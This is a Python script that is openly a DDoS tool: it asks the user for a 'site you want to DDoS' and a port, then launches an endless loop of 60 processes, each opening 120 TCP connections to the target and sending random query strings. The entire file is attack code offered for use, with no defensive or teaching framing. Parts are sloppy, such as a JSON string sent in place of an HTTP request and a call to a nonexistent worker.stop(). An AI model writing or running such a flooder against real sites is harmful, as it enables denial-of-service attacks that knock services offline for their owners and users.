import random
from helpers import useragents
# Importing http client to make http request
import multiprocessing
import json
import socket


def getRandomUrl():
    url = "/?"
    for i in range(random.randint(1, 8)):
        key = useragents.generateQueryString(random.randint(
            1, 5))
        value = useragents.generateQueryString(random.randint(
            1, 5))
        url += f"{key}={value}&"
    return url


def attack_worker(ip_address, port, number_of_sockets, ):
    try:
        sockets = []
        for i in range(number_of_sockets):
            ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ddos.connect((ip_address, port))
            sockets.append(ddos)

        for ddos in sockets:
            random_url = getRandomUrl()
            message = json.dumps(random_url).encode()
            ddos.send(message)
            ddos.sendto(message, (ip_address, port))
            ddos.send(message)

        for conn_close in sockets:
            try:
                conn_close.close()
            except:
                pass
    except Exception as err:
        print(err)


def monitor(workers):
    while len(workers) > 10:
        try:
            for worker in workers:
                if worker is not None and worker.is_alive():
                    worker.join(1.0)

                    print(f"Woker Number - {worker.name} Joined!")
                else:
                    # Removing dead workers from workers list
                    workers.remove(worker)
        except (KeyboardInterrupt, SystemExit):
            print("CTRL+C received. Killing all workers")
            for worker in workers:
                try:
                    print(f"Killing worker {worker.name}")
                    worker.stop()
                except Exception:
                    pass  # silently ignore


def main():
    host = input("Site you want to DDoS:")
    port = int(input("Enter port number:"))

    ip_address = socket.gethostbyname(host)

    # Default number of sockets
    number_of_sockets = 120

    # Defalut number of workers
    number_of_workers = 60
    print("|| DDoS Loaded ||")

    print("Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(
        "GET", number_of_workers, number_of_sockets))

    # SA3.2
    while True:
        try:
            workers = []
            for i in range(number_of_workers):
                # Define the number of workers here
                worker = multiprocessing.Process(
                    target=attack_worker, args=(ip_address, port, number_of_sockets))
                workers.append(worker)

                worker.start()

            monitor(workers)

        except Exception as err:
            print("| Connection Failed |")


if __name__ == "__main__":
    main()
